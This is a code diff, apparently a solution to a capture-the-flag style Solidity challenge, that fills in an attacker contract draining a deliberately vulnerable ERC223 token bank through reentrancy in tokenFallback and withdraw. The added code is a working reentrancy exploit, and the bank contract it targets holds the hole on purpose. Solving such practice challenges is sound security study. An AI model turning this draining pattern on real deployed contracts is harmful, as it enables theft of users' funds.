@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+import "forge-std/console.sol";
+
 interface ITokenReceiver {
     function tokenFallback(
         address from,
@@ -21,7 +23,7 @@ contract SimpleERC223Token {
 
     event Transfer(address indexed from, address indexed to, uint256 value);
 
-    constructor() public {
+    constructor() {
         balanceOf[msg.sender] = totalSupply;
         emit Transfer(address(0), msg.sender, totalSupply);
     }
@@ -95,7 +97,7 @@ contract TokenBankChallenge {
     mapping(address => uint256) public balanceOf;
     address public player;
 
-    constructor(address _player) public {
+    constructor(address _player) {
         token = new SimpleERC223Token();
         player = _player;
         // Divide up the 1,000,000 tokens, which are all initially assigned to
@@ -111,7 +113,7 @@ contract TokenBankChallenge {
     function tokenFallback(
         address from,
         uint256 value,
-        bytes memory data
+        bytes memory
     ) public {
         require(msg.sender == address(token));
         require(balanceOf[from] + value >= balanceOf[from]);
@@ -132,9 +134,42 @@ contract TokenBankChallenge {
 // Write your exploit contract below
 contract TokenBankAttacker {
     TokenBankChallenge public challenge;
+    SimpleERC223Token public token;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
+        token = challenge.token();
     }
-    // Write your exploit functions here
+    // Write your exploit functions here  
+    function exploit() public {
+        uint playerBalance = token.balanceOf(msg.sender);
+        require(playerBalance > 0, "Player has no balance");
+
+        // transfer tokens to this contract
+        token.transferFrom(msg.sender, address(this), playerBalance);
+        token.transfer(address(challenge), playerBalance);
+
+        uint depositBalance = challenge.balanceOf(address(this));
+        require(depositBalance > 0, "Deposit failed");
+
+        challenge.withdraw(depositBalance);
+
+        require(token.balanceOf(address(challenge)) == 0, "Tokens not fully withdrawn");
+        token.transfer(msg.sender, token.balanceOf(address(this)));
+    }
+
+    function tokenFallback(
+        address,
+        uint256,
+        bytes memory
+    ) public {
+        // check if the challenge has any tokens left
+        uint tokensInBank = token.balanceOf(address(challenge));
+
+        if(tokensInBank > 0) {
+            uint maxAmountToWithdraw = challenge.balanceOf(address(this));
+            uint amountToWithdraw = maxAmountToWithdraw > tokensInBank ?  tokensInBank: maxAmountToWithdraw;
+            challenge.withdraw(amountToWithdraw);
+        }
+    }
 }
